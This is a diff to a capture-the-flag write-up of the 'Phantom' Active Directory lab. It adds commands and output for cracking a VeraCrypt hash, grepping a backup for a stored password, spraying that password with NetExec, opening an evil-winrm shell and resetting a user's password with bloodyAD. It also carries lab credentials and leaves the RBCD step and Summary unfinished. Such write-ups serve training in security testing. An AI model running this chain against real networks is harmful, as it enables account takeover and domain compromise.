@@ -5,6 +5,23 @@ The "Phantom" CTF simulates a Windows Active Directory network, typical of corpo
 As such, not all typical extensive enumeration steps that were performed are documented.
 
 
+## Tools Used
+**nmap:** https://nmap.org/
+
+**NetExec:** https://github.com/Pennyw0rth/NetExec
+
+**BloodHound (legacy):** https://github.com/SpecterOps/BloodHound-Legacy
+
+**RustHound:** https://github.com/NH-RED-TEAM/RustHound
+
+**VeraCrypt:** https://veracrypt.io/en/Home.html
+
+**hashcat:** https://hashcat.net/hashcat/
+
+
+
+
+
 
 ## Technical Writeup
 
@@ -14,7 +31,6 @@ As such, not all typical extensive enumeration steps that were performed are doc
 
 ### Initial Enumeration and Reconnaissance
 
-*   **Tools**: `nmap`, `NetExec`
   
 My initial reconnaissance phase focused on gathering as much information as possible about the target system, `10.129.234.63`.
 
@@ -166,7 +182,6 @@ A positive hit for `ibryant`, we now have active credentials to iterate over our
 
 ### Further Enumeration
 
-*   **Tools**: `nmap`, `NetExec`, `RustHound`, `BloodHound`
 
 **Exploring Shares**
   
@@ -273,13 +288,140 @@ We'll use crunch (https://github.com/crunchsec/crunch), to generate a simple wor
 
 **Hashcat***
 *   **Command**: `hashcat -a 0 -m 13722 hash wordlist.txt`
+```
+hash:Phantom2023!
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13722 (VeraCrypt SHA512 + XTS 1024 bit (legacy))
+Hash.Target......: hash
+Time.Started.....: Fri Oct 17 09:09:08 2025 (6 secs)
+Time.Estimated...: Fri Oct 17 09:09:14 2025 (0 secs)
+```
+
+**Veracrypt**
+With the container password cracked, we'll use the veracrypt console to mount `IT_BACKUP_201123.hc`. Note, if you're running inside a container, ensure you have FUSE access or mount and decrypt externally.
+
+*   **Command**: `veracrypt IT_BACKUP_201123.hc /mnt/ --password='Phantom2023!'z``
+```
+├── azure_vms_0805.json
+├── azure_vms_1023.json
+├── azure_vms_1104.json
+├── azure_vms_1123.json
+├── splunk_logs_1003
+├── splunk_logs_1102
+├── splunk_logs1203
+├── ticketing_system_backup.zip
+└── vyos_backup.tar.gz
+```
+I'll unzip and untar `ticketing_system_backup.zip` and `vyos_backup.tar.gz` to have a clean tree structure to recursively grep through with `ripgrep`
+
+We'll try a basic "password" query for now to save filtering through thousands of lines
+
+**Command**: `rg -i "password"`
+
+We get a promising hit right at the end of stdout.
+```
+<SNIP>
+run/vyatta/config/config.json
+{"local-users": {"username": {"lstanley": {"password": "gB6XTcqVP5MlP7Rc"}}}
+</SNIP>
+```
+
+Referring back to `BloodHound`, `lstanley` does not have any remarkable transitive object control. However their membership of `SERVER ADMINS` raises implications, though nothing we can evidently see yet.
+
+[LStanley Membership](Outputs/Screenshots/lstanley.png)
+
+
+We'll test these credentials with `NetExec` across the domain. 
+
+**Command**: `nxc smb 10.129.234.63 -u ridusers -p 'gB6XTcqVP5MlP7Rc' --continue-on-success`
+
+```
+SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         10.129.234.63   445    DC               [-] phantom.vl\Administrator:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
+SMB         10.129.234.63   445    DC               [-] phantom.vl\Guest:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
+SMB         10.129.234.63   445    DC               [-] phantom.vl\krbtgt:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
+SMB         10.129.234.63   445    DC               [-] phantom.vl\DC$:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
+SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc
+SMB         10.129.234.63   445    DC               [-] phantom.vl\rnichols:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
+SMB         10.129.234.63   445    DC               [-] phantom.vl\pharrison:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
+SMB         10.129.234.63   445    DC               [-] phantom.vl\wsilva:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
+SMB         10.129.234.63   445    DC               [-] phantom.vl\elynch:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
+SMB         10.129.234.63   445    DC               [-] phantom.vl\nhamilton:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
+SMB         10.129.234.63   445    DC               [-] phantom.vl\lstanley:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
+```
+
+No match for `lstanley`, but we've got a hit on our HVT `svc_sspr`.
+
+
+**SVC_SSPR**
+
+With our attack path already scoped earlier, we can also remember `svc_sspr` is a member of `REMOTE MANAGEMENT USERS`, so we should be able to get an `evilwin-rm` shell on the machine.
+
+**Command**: `evil-winrm -i phantom.vl -u svc_sspr -p gB6XTcqVP5MlP7Rc`
+```
+*Evil-WinRM* PS C:\Users\svc_sspr\Desktop> ls
+
+
+    Directory: C:\Users\svc_sspr\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---        10/17/2025   1:52 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\svc_sspr\Desktop> cat user.txt
+5c66a7ab1971f8793c86676296abbb8d
+```
+
+User flag obtained.
+
+
+
+**Execution**
+
+We currently own `svc_sspr`, and as detailed earlier, we can see a clear path to domain compromise though `wsilva` and `ICT SECURITY`.
+
+Our first action is to use our [ForceChangePassword](Outputs/Screenshots/svc_sspr_control.png) over `wsilva` to reset their password and authenticate as them, moving us along our attack path.
+
+
+
+**Command**: `bloodyAD -d phantom.vl -u svc_sspr -p gB6XTcqVP5MlP7Rc --host 10.129.234.63 set password wsilva Summer2025`
+
+```
+[+] Password changed successfully!
+```
+
+With `wsilva` now under our control, we now have delegated [AddAllowedToAct](Outputs/Screenshots/RBCD.png) over `DC.PHANTOM.VL`, though our membership of `ICT SECURITY`.
+
+**RBCD**
 
 
 
 
 
 
-### Privilege Escalation
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+### Summary
 
 *   **Initial Access**: (Details to be filled in after exploitation)
 *   **Lateral Movement**: (Details to be filled in)
@@ -290,11 +432,7 @@ We'll use crunch (https://github.com/crunchsec/crunch), to generate a simple wor
 
 
 
-### Tools Used
 
-*   `nmap`: Network scanning and service enumeration.
-*   `NetExec`: SMB enumeration, user listing, and password spraying.
-*   (Add more tools as they are used in the CTF)
 
 ### Mitigations
 
